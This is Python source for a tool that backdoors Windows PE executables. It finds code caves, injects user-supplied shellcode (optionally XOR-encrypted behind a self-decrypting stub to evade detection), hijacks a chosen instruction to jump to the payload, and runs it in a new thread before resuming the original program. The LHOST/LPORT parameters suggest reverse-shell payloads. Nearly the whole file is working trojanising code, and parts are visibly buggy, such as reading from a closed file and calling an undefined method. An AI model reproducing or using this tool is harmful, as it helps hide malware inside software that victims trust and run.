# coding:utf-8

import lief
import pefile
import struct
import pepatch
from capstone import *
from keystone import *
import logger
import common
import random
import os, sys

DEBUG = 1


class Pebin(object):
    """
    PE binary class.
    """
    def __init__(self, FILE, OUTPUT, APPEND_SECTION, SHELLCODE, LHOST, LPORT, CFLAGS,\
                 LEN_SHELLCODE, CAVE_FOUND, JUMP_CAVES, ADDR_PATCH, SMC, NEW_THREAD):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.APPEND_SECTION = APPEND_SECTION
        self.SHELLCODE = SHELLCODE
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.CFLAGS = CFLAGS
        self.IS_SUPPORTED = False
        self.LEN_SHELLCODE = LEN_SHELLCODE
        self.CAVE_FOUND = CAVE_FOUND
        self.JUMP_CAVES = JUMP_CAVES
        self.ADDR_PATCH = ADDR_PATCH
        self.SMC = SMC
        self.NEW_THREAD = NEW_THREAD

        self.ppe = None
        self.lpe = None
        self.binary = None
        # some PE items will be used.
        self.fItems = {}
        self.final_bin = None
        self.pt = None
        self.smc_key = ""
        # here should be more accurate
        self.supported_arch = ['amd64', 'i386']

        # init fItems

    def support_check(self):
        # check this file if is support
        with open(self.FILE, 'rb') as f:
            f.seek(0)
        magic = f.read(2)
        if magic != '\x4d\x5a':
            logger.critical("This is not a PE file")
            sys.exit(1)
        else:
            return True

    def gather_file_info_win(self):
        pass

    def gather_info(self):
        self.ppe = pefile.PE(self.FILE)
        self.lpe = lief.parse(self.FILE)
        pass

    def find_all_caves(self):
        """
        This function find all caves in PE file
        Print to screen and return satisfied caves
        :return: cave_space; list
        """
        if self.SHELLCODE and not self.LEN_SHELLCODE:
            # Here will use rawdata shelcode, asm shcellcode should be asm
            size_of_cave_to_find = len(self.SHELLCODE)
        if not self.LEN_SHELLCODE:
            self.LEN_SHELLCODE = 380
        size_of_cave_to_find = self.LEN_SHELLCODE
        logger.info("Looking for caves")
        begin_cave = 0
        tracking = 0
        count = 1
        cave_tracker = []
        self.binary = open(self.FILE, 'rb')
        self.binary.seek(0)

        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                break
            if s == 0:
                if count == 1:
                    begin_cave = tracking
                count += 1
            else:
                if count >= size_of_cave_to_find:
                    cave_tracker.append((begin_cave, tracking))
                count = 1
            tracking += 1

        for _cave in cave_tracker:
            for _section in self.lpe.sections:
                section_found = False
                if _cave[0] >= _section.pointerto_raw_data and _cave[1] <= (_section.sizeof_raw_data + _section.pointerto_raw_data)\
                    and _cave[1] - _cave[0] >= size_of_cave_to_find:
                    logger.info("\tsection name\t'{0}'".format(_section.name))
                    logger.info("begin of cave\t{0}".format(_cave[0]))
                    logger.info("end of cave\t{0}".format(_cave[1]))
                    logger.info("\tsize if cave\t0x{0:x}".format(_cave[1] - _cave[0]))
                    logger.info("\tsize of raw data\t0x{0:x}".format(_section.sizeof_raw_data))
                    logger.info("\tpointer to raw data\t0x{0:x}".format(_section.pointerto_raw_data))
                    logger.info("\tend of raw data\t0x{0:x}".format(_section.pointerto_raw_data + _section.sizeof_raw_data))
                    logger.info("\t" + "*" * 50)
                    section_found = True
                    break
            if section_found is False:
                try:
                    logger.info("\tNo section")
                    logger.info("\tbegin of cave\t0x{0:x}".format(_cave[0]))
                    logger.info("\tend of cave\t0x{0:x}".format(_cave[1]))
                    logger.info("\tsize of cave\t0x{0:x}".format(_cave[1] - _cave[0]))
                    logger.info("*" * 50)
                except Exception as e:
                    logger.error(e)
        logger.info("\tTotal of {0:s} caves found".format(str(len(cave_tracker))))
        return cave_tracker

    def jump_caves(self):
        pass


    def use_smc(self, data):
        '''
        This functiuon will use xor to encrypted a bin shellcode and add a decrypting-func before and then jump to it
        :param smc_key:
        :return: filepath_to_smc_file
        '''
        # init the random smc key, char in range(0, 255), length no more than 20
        for i in range(random.randint(1, 21)):
            self.smc_key += chr(random.randint(1, 255))
        SMC_key = self.smc_key
        logger.info("SMC_key: {}".format(self.smc_key))

        SMCed_data = ""
        config_file_name = "xor_config.asm"
        for i in range(len(data)):
            SMCed_data += chr(ord(data[i]) ^ ord(SMC_key[i % len(SMC_key)]))
        tmp_path = common.locate_dir('tmp')
        with open(os.path.join(tmp_path, config_file_name), 'w') as f:
            """
            ;   keySize
            ;   ptrSMCSize
            ;   ptrSMCFunc
            ;   key
            """
            code = [
                "[bits 32]\n",
                "[section .mtext]\n",
                "keySize:\n",
                "call $+5\npop ebx\nret\n",
                "dd 0x{0:x}\n".format(len(SMC_key)),
                "ptrSMCSize:\n",
                "call $+5\npop ebx\nret\n",
                "dd 0x{0:x}\n".format(len(data)),
                "key:\n",
                "call $+5\npop ebx\nret\n",
                "db '{}'\n".format(SMC_key),
                "ptrSMCFunc:\n",
                "call $+5\npop ebx\nret\n",
            ]
            line = ""
            for _index in range(len(SMCed_data)):
                if _index % 8 == 0:
                   line += "db 0x{0:02x}, ".format(ord(SMCed_data[_index]))
                elif (_index + 1) % 8 == 0:
                    line += "0x{0:02x},\n".format(ord(SMCed_data[_index]))
                else:
                    line += "0x{0:02x}, ".format(ord(SMCed_data[_index]))
            code.append(line)
            f.writelines(code)
        asm_path = common.locate_dir('asm')
        with open(os.path.join(asm_path, 'xor.asm'), 'r') as f:
            xor_asm = f.read()
            config_file_path = common.locate_file(config_file_name)
            xor_asm = xor_asm.format(xor_config_file=config_file_path)
            xor_tmp_name = "xor_tmp.asm"
            with open(os.path.join(tmp_path, xor_tmp_name), 'w') as f:
                f.write(xor_asm)
        return xor_tmp_name

    @property
    def disasmble_patched_inst(self):
        """
        disasmble the patched ins
        If call/jmp int, should be transform to absolute address.
        """
        patched_inst_rawdata = ''
        for i in range(5):
            _patched_inst = self.ppe.get_string_at_rva(
                self.ADDR_PATCH - self.ppe.OPTIONAL_HEADER.ImageBase + len(patched_inst_rawdata))
            if len(_patched_inst) == 0:
                patched_inst_rawdata += '\x00'
            else:
                patched_inst_rawdata += _patched_inst
        # logger.info(patched_inst_rawdata)
        if self.lpe.header.machine == lief.PE.MACHINE_TYPES.I386:
            arch, bits = CS_ARCH_X86, CS_MODE_32
        else:
            arch, bits = CS_ARCH_X86, CS_MODE_64
        md = Cs(arch, bits)
        patched_inst_list = md.disasm(patched_inst_rawdata, 0).next()  # [0].mnemonic
        if patched_inst_list.mnemonic == 'call':
            patched_inst = str(patched_inst_list.mnemonic + ' ' + hex((int(patched_inst_list.op_str, 16) + self.ADDR_PATCH)
                                                                      & 0xffffffff))
        else:
            patched_inst = str(patched_inst_list.mnemonic + ' ' + patched_inst_list.op_str)
        return patched_inst

# This set_config_file should be trans to set_final_asm_file
    def set_config_file_and_build(self):
        """
        :return self.final_bin:
        """
        config_file_name = "config.asm"
        if self.SHELLCODE:
            shellcode_tmp ="shellcode_tmp.asm"
            self.final_bin = common.nasm_build(shellcode_tmp)
        if self.NEW_THREAD:
            create_thread_tmp = "create_thread_tmp.asm"
            self.final_bin = common.nasm_build(create_thread_tmp)
        if self.SMC:
            final_bin_path = common.locate_file(self.final_bin)
            with open(final_bin_path, 'r') as f:
                shellcode_data = f.read()
            SMC_file = self.use_smc(data=shellcode_data)
            self.final_bin = os.path.basename(common.nasm_build(SMC_file))
        return self.final_bin

    def append_section(self):
        """
        """
        if not self.ADDR_PATCH:
            logger.error("\t'-a' option should be set, an address should be special to patch.")
            sys.exit(1)
        """
        support_shellcode_type = ['exe', 'dat', 'asm', 'dll', 'c', '', 'bin']
        if self.SHELLCODE:
            extension = os.path.basename(self.SHELLCODE).split('.')[1]
            if extension in support_shellcode_type:
                shellcode_type = extension
            else:
                logger.error("This is not a support shellcode type, supported type is:\n{0:s}".format("".join(support_shellcode_type, ' ')))
                sys.exit(1)
            pt = pepatch.Patcher(self.FILE)
            with open(self.SHELLCODE, 'r') as f:
                if shellcode_type == 'dat' or shellcode_type == '' or shellcode_type == 'bin':
                    shellcode = f.read()
                    shellcode_addr, shellcode_len = pt.inject(raw=shellcode)
                    self.NEW_THREAD = True
                if shellcode_type == 'asm':
                    shellcode = f.read()
                    shellcode_addr, shellcode_len = pt.inject(asm=shellcode)
        """

        support_shellcode_type = ['exe', 'dat', "asm", "dll", "c", "bin", ""]
        if not self.SHELLCODE:
            logger.error("One shellcode should be select.")
            logger.error("Entry of shellcode should be 0 offset.")
            sys.exit(1)
        extension = os.path.basename(self.SHELLCODE).split('.')[1]
        if extension in support_shellcode_type:
            shellcode_type = extension
        else:
            logger.error("This is not a support shellcode type, supported type is:\n{0:s}".format(
                                                                    "".join(support_shellcode_type, ' ')))
            sys.exit(1)
        # write shellcode to a new file tmp/shellcode_tmp.asm
        with open(self.SHELLCODE, 'r') as f:
            if shellcode_type == 'dat' or shellcode_type == 'bin' or shellcode_type == '':
                shellcode = f.read()
                tmp_path = common.locate_dir('tmp')
                with open(os.path.join(tmp_path, 'shellcode_tmp.asm'), 'a') as sf:
                    db = [
                        "[bits 32]\n",
                        "[section .mtext]\n",
                    ]
                    line = ""
                    for _index in range(len(shellcode)):
                        if _index % 8 == 0:
                            line += "db 0x{0:02x}, ".format(ord(shellcode[_index]))
                        elif (_index + 1) % 8 == 0:
                            line += "0x{0:02x},\n".format(ord(shellcode[_index]))
                        else:
                            line += "0x{0:02x}, ".format(ord(shellcode[_index]))
                    db.append(line)
                    sf.writelines(db)
            if shellcode_type == 'asm':
                shellcode = f.read()
                tmp_path = common.locate_dir('tmp')
                with open(os.path.join(tmp_path, 'shellcode_tmp.asm'), 'a') as sf:
                    sf.write(shellcode)

        patched_inst = self.disasmble_patched_inst
        logger.info(patched_inst)

        # new code use nasm
        if self.NEW_THREAD == True:
            if DEBUG == 1:
                # THis way to use IAT hash to locate CreateThread
                create_thread_file_path = common.locate_file('hash_call_IAT.asm')
                with open(create_thread_file_path, "r") as f:
                    create_thread_asm = f.read()
                    # touch a new file
                    tmp_path = common.locate_dir('tmp')
                    with open(os.path.join(tmp_path, "create_thread_tmp.asm"), 'w') as f:
                        include_file_name = "config.asm"
                        include_file_path = common.locate_file(include_file_name)
                        search_api_asm_name = "hash_search_IAT.asm"
                        search_api_asm_path = common.locate_file(search_api_asm_name)
                        shellcode_tmp_path = common.locate_file("shellcode_tmp.asm")
                        create_thread_tmp_asm = create_thread_asm.format(include_file=include_file_path,
                                                                         hash=0x38579A82,
                                                                         shellcode=shellcode_tmp_path,
                                                                         hash_search_IAT=search_api_asm_path,
                                                                         )
                        f.write(create_thread_tmp_asm)
            else:
                create_thread_file_path = common.locate_file('create_thread.asm')
                with open(create_thread_file_path, "r") as f:
                    create_thread_asm = f.read()
                    # touch a new file
                    tmp_path = common.locate_dir('tmp')
                    with open(os.path.join(tmp_path, "create_thread_tmp.asm"), 'w') as f:
                        # include_file_name = "config.asm"
                        # include_file_path = common.locate_file(include_file_name)
                        search_api_asm_name = "search_api.asm"
                        search_api_asm_path = common.locate_file(search_api_asm_name)
                        shellcode_tmp_path = common.locate_file("shellcode_tmp.asm")
                        create_thread_tmp_asm = create_thread_asm.format(# include_file=include_file_path,
                                                                         shellcode=shellcode_tmp_path,
                                                                         search_api_path=search_api_asm_path,
                                                                         )
                        f.write(create_thread_tmp_asm)
            # patch will do later
            '''
            self.pt = pepatch.Patcher(self.FILE)
            create_thread_shellcode_addr, shellcode_len = self.pt.inject(nasm=create_thread_tmp_path.split('.')[0])
            self.pt.patch(create_thread_shellcode_addr + shellcode_len - 5, jmp=self.ADDR_PATCH + 5)
            self.pt.patch(self.ADDR_PATCH, jmp=create_thread_shellcode_addr)
            '''
    def basic_asm(self, code):
        """
        asm some code if need
        :param code:
        :return raw_data:
        """
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(code)
        raw_data = ""
        for _raw in encoding:
            raw_data += chr(_raw)
        return raw_data

    def do_patch(self, filename):
        '''
        do_patch, should be done with hex patch way, all input file should be xxx.bin
        :return:
        '''
        final_bin_path = common.locate_file(filename)
        with open(final_bin_path, 'rb') as f:
            with open(os.path.join(common.locate_file_dir(filename), 'final_tmp.bin'), 'wb') as fb:
                final_bin_content = f.read()
                final_bin_content = self.basic_asm("pushfd; pushad") + final_bin_content + self.basic_asm("popad; popfd") # pushfd; pushad; popad; popfd
                final_bin_content += self.basic_asm(self.disasmble_patched_inst)
                final_bin_content += self.basic_asm("nop\n" * 5)
                fb.write(final_bin_content)
        self.pt = pepatch.Patcher(self.FILE)
        with open(common.locate_file('final_tmp.bin'), 'rb') as f:
            data = f.read()
            final_bin_addr, final_bin_len = self.pt.inject(raw=data)
            self.pt.patch(self.ADDR_PATCH, jmp=final_bin_addr)
            if self.disasmble_patched_inst.split(' ')[0] == 'call':
                self.pt.patch(final_bin_addr + final_bin_len - 10, call=self.disasmble_patched_inst.split(' ')[1])
            self.pt.patch(final_bin_addr + final_bin_len - 5, jmp=self.ADDR_PATCH + 5)

    def save(self, output_filename):
        """
        save the out_put file
        :param output_filename:
        :return:
        """
        self.pt.save(output_filename)

    def run_this(self):
        # common.clean('tmp')
        self.gather_info()
        if self.CAVE_FOUND is True:
            cave_tracker = self.find_all_caves()
        if self.JUMP_CAVES is True:
            cave_tracker = self.find_add_caves()
        if self.APPEND_SECTION is True:
            self.append_section()
        if self.OUTPUT:
            output_filename = self.OUTPUT
        else:
            output_filename = self.FILE + '.patched.exe'
        self.set_config_file_and_build()
        self.do_patch(self.final_bin)
        self.save(output_filename)
        common.clean('tmp')
        logger.info("End")
        return True
